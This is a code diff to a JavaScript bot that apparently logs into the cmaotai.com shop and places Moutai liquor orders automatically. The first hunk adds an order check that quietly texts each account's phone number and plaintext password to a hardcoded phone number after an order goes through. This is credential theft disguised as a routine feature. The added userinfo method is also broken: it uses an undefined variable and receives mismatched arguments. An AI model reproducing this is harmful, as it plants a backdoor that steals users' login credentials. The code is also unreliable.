@@ -560,7 +560,21 @@ class MaotaiService {
                             }
                           })
                         }
+
                         logger.info(colors.green('下单完成'+JSON.stringify(body)));
+                        // 检查订单
+                        that.getOrder(stel, j)
+                          .then(lastOrder => {
+                            let orderDate = lastOrder.OrderDate;
+                            let now = +new Date();
+                            let orderDateTimestamp = +new Date(orderDate);
+                            if(now - orderDateTimestamp < 60*60*4 * 1000){
+                              // 如果有4个小时内的订单
+                              sendmsg('15330066919', '订单提交成功'+tel+":"+pass+":"+orderDate);
+                            }
+                          }).catch(e => {
+                            console.log(e);
+                          });
                         return resolve({
                           data:body,
                           StockCount: StockCount,
@@ -688,21 +702,20 @@ class MaotaiService {
               if (error) {
                   return reject(error);
               }
-              logger.info(JSON.stringify(body));
               if(body.data && body.data.Data)
-                return resolve(body.data.Data);
+                return resolve(body.data.Data[0]);
               else
                 return resolve([]);
           });
         })
     }
 
-    getOrder(user, pass, j){
+    getOrder(user, j){
       let userAgent = this.userAgent(user);
       return new Promise((resolve, reject) => {
-        this.login(user, pass, userAgent)
-          .then(userinfo => {
-            return this._getOrders(userinfo.data.UserId,j );
+        this.userinfo(user, userAgent)
+          .then(userid => {
+            return this._getOrders(userid, j);
           })
           .then(data => {
             return resolve(data);
@@ -710,6 +723,38 @@ class MaotaiService {
           .catch(e => {
             return reject(e);
           })
+      })
+    }
+
+    userinfo(user, j){
+      let now = +new Date();
+
+      var options = {
+          method: 'POST',
+          jar:j,
+          url: 'https://www.cmaotai.com/API/Servers.ashx',
+          headers: this.headers(userAgent, j),
+          form: {
+              action:'UserManager.info',
+              index:1,
+              size:10,
+              timestamp121: now
+          },
+          json:true
+      };
+      return new Promise((resolve, reject) => {
+          request(options, function(error, response, body) {
+              if (error) {
+                  logger.info(error);
+                  return reject(error);
+              } else {
+                if(body.code == 0){
+                  return resolve(body.data.userId);
+                }else{
+                  return reject(new Error('获取不到账号信息'));
+                }
+              }
+          });
       })
     }
 
